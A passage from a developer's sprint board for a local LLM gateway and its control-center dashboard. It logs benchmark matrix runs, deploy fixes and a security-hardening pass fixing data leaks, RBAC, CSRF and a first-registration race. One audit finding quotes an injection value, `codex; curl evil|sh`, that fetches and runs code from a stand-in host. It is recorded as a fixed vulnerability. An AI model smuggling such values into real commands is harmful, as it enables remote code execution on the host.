  rollup, and confirm the slot torn down clean (`pgrep -f 'gateway --model'`). It holds the GPU slot → do
  NOT start any other model run until it exits.

- [~] **codex-opencode-create-delivery** — FIX IMPLEMENTED + VERIFIED on `feature/codex-create-delivery`
  (`3d03a35`). `rewrite_json_wrapped_apply_patch` decodes the gpt-oss `-patches '[{"content":…}]'` JSON
  form before `apply_patch_block_to_fuzz`. Unit test green (7/7 apply_patch). E2E codex×gpt-oss×build:
  the `apply_patch-bridge` fired 8× and **build delivery went 0/3-land → 3/3-land (0 rc11; baseline was
  all rc11)**, 1 build PASS, `accepts exactly one argument` eliminated. No regression (raw shell path
  unchanged). Merging. RESIDUALS (follow-up, NOT blockers): (1) rpn still throws 1 rc11 — a create form
  the bridge doesn't fully land (capture the rpn `-patches` shape and cover it); (2) the remaining build
  reds are rc10 = gpt-oss writes wrong CODE (model capability, not delivery). Original evidence below:

### ▶ UCC theme page-background gap (owner reported 2026-07-03: "цветовая тема испортилась немного —
    фон стал белый", right after the blank-page fix made the dashboard visible for the first time)

- [x] **ucc-theme-bg** — DONE. Not a regression from the blank-page fix or the security hardening —
  a pre-existing framework gap that was simply invisible until the page could render at all.
  `darkTheme` (std/ui/theme.ssc) IS applied correctly everywhere `lower.ssc` has a hook for it: card
  backgrounds use `theme.colors.surface` (#1f2937, confirmed live), text uses `theme.colors.onSurface`
  (#f9fafb, confirmed on actual leaf text nodes — an earlier same-session check of a container div's
  *inherited* color looked like black-on-dark and was a false alarm from checking the wrong DOM
  level). The one thing never wired anywhere: `theme.colors.background` (#111827) never reaches the
  page canvas — `serve(view, port)`'s extern signature (`std/ui/primitives.ssc`) has no `extraCss`
  param, even though the JS-side `_ssc_ui_serve(tree, port, extraCss)` already supports one; the
  emitted base template hardcodes `body{background:#fff}` with no override path from `.ssc`. Visible
  as a plain white canvas around/behind the (correctly) dark cards.
  - Where (workaround, rozum-side only): `clients/control/deploy-ucc-web.sh` — `sed` patches
    `body{margin:0;padding:0;background:#fff;` → `...background:#111827;` in the freshly emitted
    `index.html`, right after step 2, before `check_js_syntax`. Scoped to `index.html` only —
    `login.html`/`terminal.html` are hand-rolled pages with their own already-dark CSS, not affected.
  - Real fix belongs in `scalascript` (language-level, shared by every `ssc emit-spa` app, out of
    scope for a rozum-only patch): either expose `extraCss` on the `.ssc` `serve` extern def, or have
    `emit-spa`/`_ssc_ui_serve` derive the base body background from the theme passed to `lower`
    automatically. Left as a BACKLOG item for scalascript, not blocking here.
  - Verified: Playwright load of the patched `index.html` shows `body` computed
    `background-color: rgb(17, 24, 39)` (`#111827`, exact `darkTheme.colors.background`), zero
    `pageerror`s; live-deployed and confirmed on the public Funnel URL.

### ▶ UCC dashboard blank-page incident (owner reported 2026-07-03: "На телефоне — просто пустая
    белая страница" after opening the control-center link from busi's IT-consulting site)

- [x] **ucc-duplicate-const-fix** — DONE. `control-center-live.ssc` declared `agentModelList`,
  `coderModelList`, and `sessionModelList` TWICE each at the top level (an old, differently-styled
  definition immediately followed by the one actually referenced downstream — dead leftover code
  from an earlier edit, not a security-hardening regression). The ScalaScript interpreter tolerates
  `val` redeclaration, but `emit-spa`'s React/JS codegen emits each as a plain `const` in the SAME
  script scope — a JS `SyntaxError: Identifier '...' has already been declared`. That's a PARSE-time
  error: the entire inline `<script>` fails to run, nothing mounts, the page is blank white with
  zero console signal beyond the one pageerror event (which a phone user never sees). Confirmed via
  Playwright (`chromium`, channel `chrome`) loading the live page and capturing `pageerror` — this is
  the fastest way to catch this class of "silent blank page" bug; grepping generated HTML for
  duplicate `const <name>` also works and needs no browser.
  - Where: `clients/control/control-center-live.ssc` (removed the 3 stale duplicate `val`s, keeping
    the ones each downstream `val` actually references — all three now match the codebase convention
    of reusing the shared `modelSelectCols`, same as `coderModelList`/`sessionModelList` already did
    for their surviving definition).
  - Verified: `grep -oE '^val [A-Za-z0-9_]+' control-center-live.ssc | sort | uniq -c` shows no
    duplicates; regenerated `index.html` has exactly one `const` per name; Playwright load of the
    live public Funnel URL shows zero `pageerror`s and full dashboard text content.
  - **Also added a deploy-time guard** (`check_js_syntax` in `deploy-ucc-web.sh`): parses every
    inline `<script>` in each emitted HTML with Node's `vm.Script` (syntax-check only, no
    DOM/fetch/execution) and aborts the deploy on any parse failure — would have caught this bug
    automatically before it ever shipped, since deploys today have zero automated verification of
    the emitted SPA. Also fails on an EMPTY html file / zero script blocks found (a real second
    incident during this same fix: an accidental `source deploy-ucc-web.sh` in a shell where `$SSC`
    wasn't set correctly wrote a 0-byte `index.html` to the LIVE site — `count === 0` trivially
    "passed" the original guard with nothing to check; the guard now explicitly rejects that).
  - **Live incident recap**: the accidental sourced run (see above) briefly took the real
    `~/.rozum/ucc/site/index.html` down to 0 bytes on the production box. Caught immediately via
    `wc -c`, fixed by regenerating from the correct `$SSC` path and copying over; Playwright-verified
    the live public URL renders cleanly afterward. **Lesson: never `source` a deploy script (or any
    `set -e` script) under `|| true` / inside a conditional — bash's `errexit` is silently suspended
    for the ENTIRE sourced script's execution in that context, so a failing step doesn't stop later,
    more dangerous steps (here: it still reached the launchd restart). Run it as a real subprocess
    (`bash script.sh`), or copy just the function you need, never `source` under a conditional.**

### ▶ UCC first-registration TOFU race (owner 2026-07-03: revisiting the deferred item from the
    security-hardening pass above — "Да" to fixing it now)

- [x] **ucc-tofu-bootstrap-token** — DONE. The last deferred finding from `ucc-tofu-bootstrap-note`:
  `register_begin_route` requires no invite while `users.is_empty()` — whoever reaches
  `/control/auth/register/begin`+`finish` first (right after a fresh deploy or a full credential
  wipe) becomes the permanent admin, no allowlist. Fix: generate a random bootstrap token at
  startup (mirrors busi's own phone-pairing "code shown on the computer" pattern), persist it to a
  state file + print it to the log, and require it as the `invite` field on the FIRST registration
  only (same code path `check_invite` already gates subsequent registrations with, so no new
  concept). Consume/delete the token once the first admin is created — one-shot, like an invite
  with `max_uses:1`. Update `login.ssc`/`login.html` to read a `?token=` query param and forward it
  as `invite` on `register/begin` so the owner can actually supply it (open
  `https://.../login?token=<token>`, token read from the log or state file).
  - Where: `crates/rozum-gateway/src/control.rs` (`register_begin_route`, `register_finish_route`,
    a new `ensure_bootstrap_token`/`bootstrap_token_path`/`consume_bootstrap_token` near
    `check_invite`), `clients/control/login.ssc` + `login.html`.
  - Done-when: a register/begin with no matching token while `users.is_empty()` is rejected 403;
    with the correct token it proceeds; after the first admin exists, the token file is gone and
    normal invite-gating (already correct) takes over unchanged.
  - Result: `ensure_bootstrap_token`/`bootstrap_token_path`/`consume_bootstrap_token` added; startup
    prints the token + a ready-to-use `?token=` login URL when `users.is_empty()`.
    `register_begin_route` now requires it (`bootstrap_token_matches`, unit-tested); restructured
    `register_finish_route`'s branching to key off `users.is_empty()` first so the bootstrap token
    (carried in `inflight.invite_token`) isn't wrongly looked up as a real stored invite (which would
    have silently no-op'd — caught before shipping). `login.ssc`/`login.html` read `?token=` and
    forward it as `invite` on `register/begin`; regenerated `login.html` from source via
    `ssc run login.ssc` (also fixed a pre-existing drift: the committed HTML predated a login.ssc
    text change). 95 tests green (1 new); live-smoke-tested with an isolated HOME/port: no-token →
    403, wrong-token → 403, correct-token → 200 + WebAuthn challenge; token file confirmed `0600`.

### ▶ matrix baseline — 5 DEFAULT_MODELS × claude × REPS=3 (operator 2026-07-03)

- [x] **matrix-baseline-2026-07-03** — run full DEFAULT_MODELS matrix (claude agent, REPS=3, all 6
  tasks: greet rpn build fix test debug) to establish an updated agentic baseline now that all 5 models
  are in DEFAULT_MODELS: 35B-DWQ, Qwen3-Coder-30B, Devstral-Small-2507, GLM-4.7-Flash, GLM-32B→gpt-oss.
  Key gaps: Devstral only REPS=1 proven; Qwen3-Coder only REPS=2; others already 15/15.
  - Command: `REPS=3 AGENTS=claude scripts/bench/agentic.sh`
  - ISSUE (2026-07-03 first run): 35B-DWQ (~25.8 GB) and Coder-30B (min ~22.5 GB) FAIL admission
    — free RAM was only 21.4 GB (XProtect + 3 CC sessions + Chrome). Devstral loaded fine.
    To retry those two: close Chrome + spare CC windows, then rerun.
  - ISSUE (greet verify-gate): `rozum launch`'s `derive_target` asked Devstral to formalize
    the greet prompt ("Reply with exactly the single word: pong") → model returned a cargo
    run/verify command → repair loop ran for the full 600s RUN_TIMEOUT → greet timed out with
    timeout=1 but pass=1 (pong was already in the log from turn 1). FIXED in agentic.sh: added
    `ROZUM_VERIFY=0` env to the runner so the gateway's repair loop is disabled (bench has its
    own `verify_task`). Affects reps 2+3 of greet in the current run (still unclean), fixed for
    all future runs.
  - ISSUE (Devstral test 0/3 — gateway 500): the test task consistently fails with rc=1 (5 turns,
    1 tool use, ~200s). Root cause: gateway returns HTTP 500 on the SECOND generation after the
    agent writes Cargo.toml. The 500 triggers claude's retry loop → after 5 retries the failover
    watchdog fires and tries to respawn the gateway. The src/main.rs is never written → verify FAIL.
    Identical across all 3 reps (ROZUM_SAMPLING_SEED=1234 = fully deterministic). Other tasks pass 3/3.
    NOT a capability issue — the model never gets to generate src/main.rs. Logged as BUG below.
  - Devstral DONE: 15/18 (greet 3/3✓, build 3/3✓, fix 3/3✓, test 0/3✗ infra, debug 3/3✓, rpn 3/3✓)
  - GLM-4.7-Flash DONE: 17/18 (greet/build/fix/test/debug 3/3✓, rpn 2/3 — rep2 rc=11 delivery).
    test 3/3✓ confirms bench-test-gateway-500 is Devstral-specific, not shared infra.
  - GLM-32B+gpt-oss DONE: 16/18 (greet/build/fix/test/debug 3/3✓, rpn 1/3 — reps 1+2 rc=1 capability).
  - **RESULT (3 of 5 models, 35B-DWQ + Coder-30B skipped — RAM):**
    Devstral 15/18 · GLM-4.7-Flash 17/18 · GLM-32B+gpt-oss 16/18 = **48/54 (89%)**
    results: `scripts/bench/results/agentic-20260703-145343/per-run.csv`
  - Remaining: rerun 35B-DWQ + Coder-30B after freeing RAM (close Chrome + spare CC windows).

- [ ] **bench-test-gateway-500** — BUG (found 2026-07-03 Devstral matrix run). The `test` task
  (create Cargo.toml + src/main.rs with fn reverse + #[cfg(test)] + run cargo test + cargo run)
  consistently fails with rc=1 for Devstral-Small-2507-4bit (REPS=3, all 3 reps, 0/3 pass).
  Root cause: gateway returns HTTP 500 after the Write Cargo.toml tool result, when the model
  tries to generate the next response (create src/main.rs). With ROZUM_SAMPLING_SEED=1234 the
  sequence is fully deterministic. The model WOULD likely pass but never gets to generate
  src/main.rs. To reproduce: `TASKS=test REPS=1 AGENTS=claude scripts/bench/agentic.sh`.
  Debug angle: try `ROZUM_SAMPLING_SEED=` (unset) to check if a different seed avoids the 500;
  also check gateway stderr for MLX errors during the second generation. If seed-sensitive, likely
  a specific generated token sequence triggers an MLX error.
  **RE-SCOPED 2026-08-04 (model frozen on Qwen3.5-4B).** Kept in SPRINT — unlike the parked items this
  is OUR bug, in the gateway, on the live serving path, and a 500 mid-conversation would bite any
  model. But it can no longer be reproduced as written: `Devstral-Small-2507-4bit` is not on disk.
  So the task is now the cheap check first: run `TASKS=test REPS=3 AGENTS=claude
  AGENTIC_MODELS="mlx-community:Qwen3.5-4B-MLX-4bit" scripts/bench/agentic.sh` against the frozen
  model and watch gateway stderr for a 500 after the first tool result. If it does NOT reproduce,
  close it as "died with its model" and say so here — do not re-download Devstral to chase it. If it
  DOES, the original debug angle above still applies and it becomes a real BUGS.md entry.

### ▶ deploy-ucc-web.sh gateway-binary gap (found 2026-07-03 while verifying the security fix below)

- [x] **ucc-deploy-script-stale-binary** — DONE. After landing `feature/ucc-security-hardening`
  (control.rs) and running `deploy-ucc-web.sh`, `/control/status` STILL returned 200 unauthed on the
  live `:8411` service. Root cause: `rozum-cli`'s `rozum` bin is a pure-std dispatcher with NO
  dependency on `rozum-gateway` — it `exec`s a sibling `rozum-gateway` binary at runtime (resolved
  next to itself, else `PATH`). The deploy script only ever built+copied the thin dispatcher
  (`target/debug/rozum` → `~/.rozum/bin/rozum-ctrl`); the actual engine binary the dispatcher execs
  fell through to a STALE `~/.cargo/bin/rozum-gateway` (`cargo install`ed 2026-07-01, untouched by
  this script) — so every control.rs fix silently never reached the running service.
  - Where: `clients/control/deploy-ucc-web.sh`.
  - Result: added a step building `cargo build -p rozum --bin rozum-gateway --release` and copying
    it to `~/.rozum/bin/rozum-gateway` (sibling to the dispatcher, so `resolve()` picks it up first
    — doesn't touch the global `~/.cargo/bin/rozum-gateway` that `com.rozum.meeting-daemon` uses
    directly and unrelatedly). Also: a `sleep 1` + one retry around `launchctl bootstrap` (bootout is
    async and an immediate bootstrap intermittently fails "Input/output error" — hit this live), and
    the final smoke-check now hits `/control/auth/status` (genuinely public) instead of
    `/control/status` (401-unauthed is now the CORRECT result there, not a failure).
  - Live-verified end to end: rebuilt `rozum-gateway --release`, copied next to the dispatcher,
    restarted `com.rozum.ucc-control` — `/control/status`/`/chat/messages`/`/control/matrix/status`
    now 401 unauthed; `/`, `/control/auth/status`, `/control/public/matrix` unaffected (still public).

### ▶ UCC control-center security hardening (owner 2026-07-03: about to link the tailnet-only
    control-center URL from busi's public "IT Consulting" site; asked for a security double-check
    first — a static review of `crates/rozum-gateway/src/control.rs` found it is NOT safe to expose
    more widely yet. Fixing before the busi link goes live on it.szykownia.pl.)

- [x] **ucc-auth-status-leak** — DONE. `/control/status`, `/chat/messages`, `/chat/incidents`,
  and the non-token-gated `/control/matrix/status|log|cell|live` are in the `public` router (no
  `require_auth`) and return live coder-job workdirs + full task prompts, live terminal session ids,
  chat-agent lists, meeting room names, and full agent chat transcripts to ANY client that reaches
  the URL — no login. The `/control/public/matrix*` + `/view/{token}` routes already do this
  correctly (admin-issued, revocable view tokens) — the plain `/control/matrix/*` routes bypass that
  gate entirely with the same data. Fix: move all of these behind a new `require_perm("read")`
  middleware (mirrors `require_admin`) inside the authenticated router.
  - Where: `crates/rozum-gateway/src/control.rs` router setup (~line 20-90).
  - Result: added a `reads` sub-router (`/control/status`, `/chat/messages`, `/chat/incidents`,
    `/control/matrix/status|log|cell|live`) gated by new `require_perm_read` middleware, merged into
    `protected` (behind `require_auth`). Live-verified: no cookie → 401 on all six; `/control/public/matrix`
    (token-gated) and `/control/auth/status` unaffected (still public).
- [x] **ucc-session-launch-injection** — DONE. `session_launch_route` (control.rs:863) builds
  `format!("{} launch --model {} {}", exe, model, agent)` and hands it to `tmux new-session` as a
  single shell-command string — `model`/`agent` come straight from the JSON request body, only
  `.trim()`'d, so a value like `codex; curl evil|sh` is shell-interpreted by tmux. (`coder_launch_route`/
  `spawn_coder` already use `Command::args` — argv, no shell — so they were NOT vulnerable; this was
  isolated to the tmux shell-command string.)
  - Where: `crates/rozum-gateway/src/control.rs:841-882`.
  - Result: new `shell_safe(s)` helper (alnum + `-_./:@+` only) rejects `agent`/`model` before
    `inner` is built → 400 instead of reaching `tmux new-session`. Unit tests
    `shell_safe_accepts_realistic_model_and_agent_names` / `shell_safe_rejects_shell_metacharacters`.
- [x] **ucc-rbac-enforce** — DONE. Only `/control/admin/*` checked `require_admin`; every other
  `protected` route only checked "has a valid session" — a `readonly`-role user could launch
  sessions/coders and attach the live terminal.
  - Where: `crates/rozum-gateway/src/control.rs` router setup + new `require_perm_*` fns near
    `require_admin`.
  - Result: split `protected` into `chat`/`agents`/`matrix`/`projects` sub-routers, each with its own
    `require_perm_<x>` inner layer (mirrors the existing `admin` sub-router), matching
    `default_roles()` (`operator` holds read+chat+agents+matrix+projects; `readonly` now correctly
    can't act on any of them — session/coder/matrix launch, chat post, project add all 403 for it).
- [x] **ucc-busi-sso-scope** — DONE. `user_has_perm` (control.rs:1763) hardcoded
  `if user_id == "busi-sso" { return true; }` — unconditional admin for ANY device paired to the
  separate busi app, bypassing the role system entirely.
  - Where: `crates/rozum-gateway/src/control.rs:1762-1772`, `auth_status_route`.
  - Result: `busi-sso` now maps to the same permission set as the built-in `operator` role
    (read/chat/agents/matrix/projects), NOT admin; `auth_status_route`'s reported permissions updated
    to match. Unit test `busi_sso_gets_operator_perms_not_admin`.
- [x] **ucc-csrf-hardening** — DONE. Cookie was `SameSite=None` with no CSRF token;
  `coder_stop_route`/`session_stop_route` accept a raw `body: String` regardless of Content-Type — a
  CORS "simple request" a cross-site page could POST with credentials to stop the owner's sessions.
  - Where: `crates/rozum-gateway/src/control.rs:2109-2111` (`set_cookie`).
  - Result: `SameSite=None` → `SameSite=Lax` (SPA+API are same-origin per `serve`'s own doc comment,
    so Lax loses nothing) — blocks the cookie from riding along on a cross-site POST/fetch.
- [x] **ucc-origin-port-stale** — bonus fix found while verifying the above (not in the original
  review): `rp_origin()` defaulted to `https://busi.tail1174e2.ts.net:8447`, a leftover from the old
  two-port (SPA+API split) layout in `docs/specs/unified-control-center.md`; the current deployment
  (`deploy-ucc-web.sh`) consolidates both behind `:8448`, and `com.rozum.ucc-control.plist` sets no
  `ROZUM_UCC_ORIGIN` override — so every WebAuthn ceremony's origin check was failing against the
  live `:8448` origin. Fixed the default to `:8448`; also fixed the same stale `:8447` link in
  `clients/meeting/meeting.ssc`'s 🎛 control-center toolbar link.
- [x] **ucc-tofu-bootstrap-note** — CLOSED as implemented by `ucc-tofu-bootstrap-token` (see the
  2026-07-03 entry above): while `users.is_empty()` registration requires the 0600 bootstrap token
  printed to the service log (no-token → 403). Stale board entry cleaned 2026-07-07.

`cargo build --workspace` + `cargo test -p rozum-gateway` (94 passed) green; live-smoke-tested the
router changes on a throwaway port/HOME (401s where expected, public routes unaffected). NEXT: go
back to `busi` and run `make deploy-it` to push the "IT Consulting" → rozum control-center link
(already committed on busi `main` at `845540cf`) live to it.szykownia.pl — the thing this whole
security pass was gating.

### ▶ runtime correctness + matrix quality (operator 2026-07-02)

- [x] **smmr-D-coresident-gate** — DONE (2026-07-02, master `208fa73`). `eager_coresident_footprint()`
  in `src/main.rs`: Σ `runtime_active_bytes(model_i)` + ONE `process_reserve_bytes(max_weight)` instead
  of Σ `estimate_model_footprint_bytes(model_i)` which double-counted the ~5.5 GiB shared MLX
  buffer-cache + prefill-spike reserve. Saves ~5.5 GiB per extra co-resident tier — a 2-tier
  Qwen3-4B→Coder-7B pair now estimates ~16.5 GiB vs the old ~22 GiB. Used in both
  `pipeline_is_eager()` and the EAGER branch of `cascade_local_footprint()`. Falls back to Σ full
  estimates when any tier is unknown (sentinel preserved). 3 new unit tests; 93 total green.

- [x] **smmr-D-active-split** — DONE (2026-07-02, master `c489fc1`). Track `get_active_memory()` (non-reclaimable: weights + KV +
  activations) separately from `get_peak_memory()` (total = active + cache) during MLX generation.
  Record both in `footprint-peaks.json`. Use the ACTIVE peak, not total peak, as the co-residency
  gate: two models can co-reside when `active_A + active_B + active_reserve ≤ free_total`. Today the
  gate uses `peak_total` and over-refuses valid co-resident pairs where cache dominates. Also expose
  both values in the `/control/status` residency block (visible in UCC) and via `obs`.
  - Where: `crates/rozum-mlx/src/mlx_native_backend.rs` — in `run_generation_loop` (or equivalent),
    after `mlx::eval()`, sample `mlx_rs::memory::get_active_memory()` and keep a running max in the
    worker state. Record in `crates/rozum-core/src/footprint.rs` under key `<model>:active_peak`.
    Gate in `crates/rozum-core/src/share.rs`: `admits_coresident(a, b)` uses stored active peaks
    when available, falls back to total peak otherwise.
  - Done-when: `ROZUM_PEAK_DEBUG=1 rozum launch --model A claude …` logs `active_peak_mb / total_peak_mb`.
    `footprint-peaks.json` contains `<model>:active_peak` keys. Unit test in `share.rs` covers the
    active-split path.

- [x] **agentic-rc-structured** — DONE (2026-07-02, `c489fc1` + `ee96e67`). All 5 codes implemented:
  `rc=0` (pass), `rc=2` (infra), `rc=10` (verify FAIL — files written but wrong), `rc=11` (verify SKIP
  — Cargo.toml absent after clean agent exit, delivery failure), `rc=124` (timeout). Matrix UI: ⚡инфра /
  задача / ∅skip / ⏱ in cell grid + detail legend. `bash -n` clean.

- [x] **matrix-live-persist** — DONE (2026-07-02, master `c489fc1`). `MatrixLive` now persists to `~/.local/state/rozum/matrix-live.json`; a `launchctl kickstart -k`
  mid-run resets it and the matrix panel shows nothing until the next poll cycle. Persist the struct
  to `~/.rozum/matrix-live.json` on every update; read it at startup. Stale files (>30 min) are
  ignored on startup.
  - Where: `crates/rozum-gateway/src/control.rs` — `update_matrix_live` / `run_matrix_job`.
    Add `persist_matrix_live(&MatrixLive)` and `load_matrix_live()` helper fns.
  - Done-when: kill and restart gateway mid-matrix-run; `/control/matrix/live` returns the
    in-progress state within one poll cycle.

- [x] **matrix-reps-default** — DONE (2026-07-02, master `221c09b` + matrix.html patch 2026-07-02).
  agentic.sh already had `REPS` support (line 106: `REPS="${REPS:-1}"`). Exposed in matrix.html UI:
  "N прогонов" selector (1/3/5) that passes `REPS=N` in the request body. Backend `MatrixRunReq` /
  `MatrixJob` gained `reps: Option<u32>`; `run_matrix_job` passes `REPS=N` to agentic.sh; `total_cells`
  accounts for REPS. Matrix grid: `idx` now aggregates all rows for the same `(model,agent,task)` key
  into `{passCount, infraCount, timeoutCount, rows}`; cells show `k/N` fractional pass-rate when N>1
  (full green ✓, partial faded `1/3`, full fail ✗/⚡/⏱); `agentTotal` column is the sum of
  per-task pass-rates (fractional when mixed). `~/.rozum/ucc/site/matrix.html` updated in-place.

- [x] **mcp-proxy-http** — DONE (2026-07-02). BUG-004 Phase 2 deployed. `rozum mcp-http` (rmcp
  streamable-HTTP) was already implemented in `crates/rozum-meeting/src/meeting/http_proxy.rs` +
  `crates/rozum-meet/src/main.rs`. Built release binary → `~/.rozum/bin/rozum-meet`. Installed
  launchd service `com.rozum.mcp-http` (port 8779, project=/work/my/rozum, KeepAlive=true).
  Changed `~/.claude.json` `mcpServers.rozum` → `{type:"http", url:"http://127.0.0.1:8779/mcp"}`.
  Result: mcp-proxy process death can no longer lose tools — CC reconnects to the permanent daemon.
  Tested: `initialize` SSE response verified live.

- [x] **tool-dialect-spi** — DONE (stages 1–4 per `docs/specs/architecture-spi.md`). The private
  `ToolDialect` trait already lives in `crates/rozum-mlx/src/mlx_native_backend.rs` (template-driven,
  not model-name-driven): `QwenDialect`/`HarmonyDialect`/`GlmDialect`/`GlmArgKvDialect` dispatched by
  `dialect_for(template)`. Stage 3 rejected WireProtocol as a trait (net-negative vs typed extractors).
  Stage 4 MCP `ToolSource` adapter done. Only ONE remaining `model.contains("glm")` at line 4269 in
  `model_is_glm()` for artifact synth (intentional + default-OFF). Original multi-day rewrite plan was
  superseded — the current design is cleaner and already done.

### ▶ meetings .ssc strict token mode (operator 2026-07-01)
- [x] **mtg-ssc-strict-token-mode** — DONE (2026-07-01). Added optional
  `ROZUM_MEETING_REQUIRE_TOKEN=1` enforcement to the pure `.ssc` meeting PWA. Default remains
  permissive for local/Tailscale use: no token can still act, observer tokens are read-only, and
  responder/admin tokens can act. In strict mode no/invalid token becomes read-only: chat posting,
  incident lifecycle actions, room/model/gateway management, and model-participant start/stop are
  hidden/disabled in the UI and rejected server-side. Valid token posts/actions are attributed with
  `--as <handle>` where that path already supports it. Also fixed the chat composer DOM order so the
  existing JS reads the visible message input instead of the hidden room field. Validation:
  `clients/meeting/build.sh /tmp/rozum-meeting-ssc-strict-test` compiled the generated Rust binary.

### ▶ matrix/model-agent improvement track (operator 2026-06-30)
- [x] **matrix-rerun-reds-merge** — DONE (2026-06-30). Added
  `scripts/bench/rerun_reds.py`: reads a result dir, `per-run.csv`, or full stdout log; finds only cells
  whose verifier pass-rate is not fully green; reruns exact `(agent, model, task)` cells one at a time
  (no accidental AGENTS×TASKS cross-product); and emits `rerun-plan.csv`, optional `rerun-per-run.csv`,
  latest-wins `merged-per-run.csv`, and `summary.txt`. Dry-run on the full matrix correctly finds the 5
  real red verifier cells, not green `greet` cells with non-zero agent rc.
- [x] **opencode-tool-protocol-stabilization** — DONE (2026-06-30). Added a gpt-oss/harmony history
  sanitizer in the MLX render path: orphan tool-result turns are dropped before chat-template render,
  while valid assistant ToolUse → ToolResult loops are preserved. This prevents the observed
  `tool role, but there was no previous assistant message with a tool call` template exception from
  poisoning the next opencode/gpt-oss request after invalid tool JSON.
- [x] **model-capability-registry** — DONE (2026-06-30). Added
  `scripts/bench/matrix_capabilities.py`, which builds a machine-readable JSON registry from one or more
  matrix CSVs/result dirs: model/agent/task pass-rate, status, mean/latest seconds, footprint, repairs,
  and latest row source.
- [x] **matrix-promotion-policy** — DONE (2026-06-30). The capability registry encodes the first policy:
  `green = all runs pass and runs >= green_min_runs` (default 3), `yellow = at least one pass but partial
  or single-run evidence`, `red = zero passing runs`, `gray = reserved for known-but-not-run/refused`.
- [x] **matrix-ram-aware-scheduler** — DONE (2026-06-30). Added
  `scripts/bench/plan_matrix_schedule.py`, which calls `rozum-gateway gateway --dry-run` per model,
  parses the admission verdict/estimated footprint, orders loadable models by footprint, and can emit a
  safe `MODELS` list. `run_full_matrix.sh` wires it behind opt-in `MATRIX_RAM_SCHEDULE=1`.
- [x] **agent-specific-repair-profiles** — DONE (2026-06-30). `agentic.sh` repair prompts now include an
  explicit delivery profile per agent: opencode gets JSON-safe one-line Bash guidance, codex gets
  whole-file tiny-project replacement guidance, claude stays on normal minimal Read/Edit/Bash repair.
  This is prompt-level guidance only, no hidden file mutation.
- [x] **matrix-report-ui-data** — DONE (2026-06-30). Full matrix runs now emit `capabilities.json` next
  to `per-run.csv`, and still print the human summary plus a ready `rerun_reds.py` command. This gives
  future UCC/UI a stable JSON artifact with status/time/RAM/repair data instead of scraping logs.

### ▶ weak-coder delivery (operator 2026-06-29: "поизучай слабых новых моделей — у них есть что-то чего мы не замечаем")
- [x] **weak-coders-under-measured-by-delivery** — DONE. The weak/new coders' low create scores are a
  tool-call DELIVERY artifact, not capability: they narrate a correct solution in a markdown ```rust
  fence and never name Write → nothing lands → 0/N. PROVEN: Coder-7B's narrated rpn code (scored 0/2),
  written to src/main.rs, compiles + passes both verify cases (35, 14). Fix = synth **Mode-1b** (master
  `179f48d`): unlabeled full-program (`fn main`) fence → Write src/main.rs. Live A/B: Coder-7B build
  **0/2 → 2/2** (files land in all workdirs); rpn stays 0/2 = honest correctness variance, not delivery.
  **GATED to the universal opt-in `ROZUM_ARTIFACT_SYNTH=1`** (master `ae75753`) after a GLM-4-32B
  regression sweep — so the GLM family default-on synth path is byte-identical. Method now in memory
  [[project-downloaded-models-toolcall-dwq]]: a 0/N CREATE score is a delivery signal first — extract
  the model's ```rust fence and compile it standalone before calling the model weak.
- [x] **qwen25-rpn-sectioned-artifact-synth** — DONE (`feature/qwen-rpn-artifact-synth`, 2026-06-29).
  Qwen2.5-Coder-7B `rpn` was still red with universal synth because a rust-ish artifact fence could
  contain both `// Cargo.toml` and `// src/main.rs`; Mode-1b saw `fn main` and wrote the whole section,
  including `[package]`, into `src/main.rs`. Fix: sectioned first-line filename labels are split before
  the full-program fallback; single first-line labels are stripped before write. Unit: 11/11 synth tests
  green. Live: `claude × Qwen2.5-Coder-7B-Instruct-4bit × rpn`, `ROZUM_ARTIFACT_SYNTH=1`, `NCTX=8192`:
  **PASS 1/1** in 21.0s, turns=4, tools=2, repairs=0, verifier outputs 35 and 14.
- [x] **qwen3-4b-repair-hints** — DONE (`feature/qwen3-4b-repair-hints`, 2026-06-29). Cheap Qwen3-4B is
  not just `greet`: targeted low-load cells show `build/rpn/debug` pass, while `fix/test` failed due
  delivery-shaped repair issues (`edit_requires_read`, then malformed `Cargo.toml`). Fix: verify-repair
  diagnostics now surface same-run Read-before-Edit failures from `agent.log`, tell weak agents not to
  stop after saying "I will read", allow Bash heredoc/python exact replacement for tiny benchmark files,
  and give a canonical `[package]` manifest hint (not `package = "..."`). Validation:
  `bash -n scripts/bench/agentic.sh`; Qwen3-4B `fix/test` **0/1 → 1/1 each** with `REPAIR=1`.
  Combined targeted evidence now covers Qwen3-4B `build/fix/test/debug/rpn` green, but `rpn` is slow
  (277s, 22 turns), so require multi-rep before making it a default agentic pick.
- [x] **matrix-e2e-harness-summary** — DONE (2026-06-29). Fixed low-load e2e harness drift without
  loading a model: `run_full_matrix.sh` now uses the same DWQ 35B default as `agentic.sh`, defaults
  `REPAIR=1`, falls back to the debug binary when release is absent, prints the real `per-run.csv`
  path, and auto-runs the summary. `summarize_matrix.py` now reads either the stdout log, a result dir,
  or `per-run.csv` directly, keeps pipeline model labels intact, includes `rpn` in task order, and
  reports pass-rates across reps instead of forcing operators to parse raw CSV.
- [x] **glm-pipeline-benchmark-repair-recipes** — DONE (2026-06-30). The full matrix showed real
  delivery regressions only on the GLM-4-32B + gpt-oss pipeline: `codex` red on `fix/test/debug/rpn`
  and `opencode` red on `rpn`. Fix: tiny benchmark verify-repair now uses a dedicated benchmark mode
  instead of mixing whole-project replacement recipes with the generic "minimal change" repair prompt;
  it forbids `apply_patch`/`cargo init` for these synthetic cells, includes canonical replacement
  scripts for `build/fix/test/debug/rpn`, and adds a one-line RPN shell command so opencode does not
  break tool JSON on nested heredocs. Targeted low-memory reruns (`NCTX=8192`, `REPAIR=1`) now prove the
  previously red cells green: `codex/fix` 1/1 (289.1s), `codex/test` 1/1 (601.9s + manual verifier),
  `codex/debug` 1/1 (407.6s), `codex/rpn` 1/1 (365.4s, 1 repair), and `opencode/rpn` 1/1 (246.1s)
  after the one-line command. Full `NCTX=32768` matrix rerun remains a quiet-slot follow-up because the
  host RAM gate rejected it.
- [x] **glm-fix-readcall-corruption** — FIXED + VALIDATED (master `ea23b7a`, 2026-06-29). GLM-4-32B-0414
  failed `fix` **0/2 consistently**: src/main.rs ended up containing a `Read\n{"file_path":...}`
  tool-call's TEXT instead of code. ROOT CAUSE (captured real output): GLM-4 dense wraps its calls in a
  fence (```bash\nRead\n{json}```) and names the file in the preceding prose; `parse_tool_calls` claims
  the Read, but synth **Mode-1** (prose-filename fallback) ALSO grabbed the same fence body and wrote it
  into src/main.rs. Pre-existing (NOT Mode-1b). FIX: `body_is_fenced_tool_call` skips a fence whose body
